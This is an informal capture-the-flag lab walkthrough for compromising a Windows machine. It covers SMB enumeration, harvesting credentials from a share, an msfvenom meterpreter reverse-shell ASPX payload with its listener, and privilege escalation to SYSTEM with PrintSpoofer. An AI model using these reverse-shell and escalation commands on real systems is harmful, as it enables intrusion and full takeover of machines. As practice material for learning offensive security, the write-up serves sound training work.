getend group | grep kali -> look at groups which are in kali
install docker - sudo apt install docker.io
sudo apt install podman - install podman
sudo visudo - sudoers
sudo usermod -aG nameofgroup nameofuser
(sudo usermod -aG docker mark)

1. did the nmap scan. found smb on 445 and RDP on 3389

2. enumerating SMB port
run smb client

[smbclient -L ip -p 445]
[locate .nse |grep smb-enum] - run these script using nmap scripts[nmap --script=]

after the enumerating we can find out that there is a share named nt4wrksv.  then we can log into it and see the content. 

[smbclient //ip/nt4wrksv] or [smbclient \\\\ip\\nt4wrksv]

we found password.txt in this share. its encoded using base64. lets be there later.

__ check whether users and passwords are valid __
use psexec.py

[python3 psexec.py 'bob:password@ip']

evil-winrm also can be used. but didn't work in this machine

[evil-winrm --ip ip --user username --password password]

3. run vulnerability scan using nmap script.

[nmap --script vuln -Pn -p ports ip] - -Pn - doesn't check whether ports are exist.

we found (ms17-010) remote code execution. 
using searchploit we can get eternalblue exploit. 

[searchsploit eternalblue]

lets mirror windows server 2016 exploit to current working dir.

[searchsploit -m ]


# first step

i went for this step. it seems easy. i created a revese shell using msfvenom and uploaded it to smb share and triggered it using web. 
creating the reverse shell. 
[msfvenom -l payloads | grep windows | grep reverse | grep shell ]

[msfvenom -p windows/x64/meterpreter_reverse_tcp --list-options]

[msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=10.8.50.72 lport=4444 -f aspx -o shell.aspx] - windows/x64/meterpreter/reverse_tcp also worked

also pentest.ws site can be used to create the same path to get the reverse shell

[ https://pentest.ws/tools/venom-builder ]

put the shell in shares. 
[smbclient //ip/sharename] then [put shell.aspx]

creating the listner 

[kali@kali:/data/vpn$ msfconsole -q
msf5 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf5 exploit(multi/handler) > set payload windows/x64/meterpreter_reverse_tcp
payload => windows/x64/meterpreter_reverse_tcp
msf5 exploit(multi/handler) > set lhost 10.8.50.72
lhost => 10.8.50.72
msf5 exploit(multi/handler) > set lport 4444
lport => 4444
msf5 exploit(multi/handler) > run]

triggering the shell.aspx

[curl http://ip:49663/sharename/shell.aspx]

then it will connect to the server. go to the bob desktop. there will be the user flag. 

[cd c:/users/bob/Desktop]


# Root priviledge 

first use shell command u idiot.

[shell]

now see the priviledges 

[whoami /priv]

Now that we have shell access we can use the whoami /priv command to check our user privileges. We see that we have SeImpersonate privileges, which can commonly be used to escalate using a potato attack, or with incognito if impersonation tokens exist. However, DCOM is disabled on this server which prevents potato attacks, and there are no tokens to impersonate.
(i don't know what this is)

There is a newer exploit that came about several months ago called [Printspoofer](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) that exploits a vulnerability in Windows where certain service accounts are required to run with elevated privileges utilizing the SeImpersonate privilege. We see that we are the iis apppool\defaultapppool service account user, which should allow us to elevate using the Printspoofer exploit.

upload printspoofer to the smb share. 

now go to this directory

[cd c:/intepub/wwwroot] now u can see the smb share in it. go to it. and run the exe file.

[PrintSpoofer -i -c cmd] - to gain root priviledges .

[whoami] - will show nt authority/system.

[cd c:/users/administrator/desktop/] there will be root.txt

[type root.txt] - will read it. cat command doesn't work


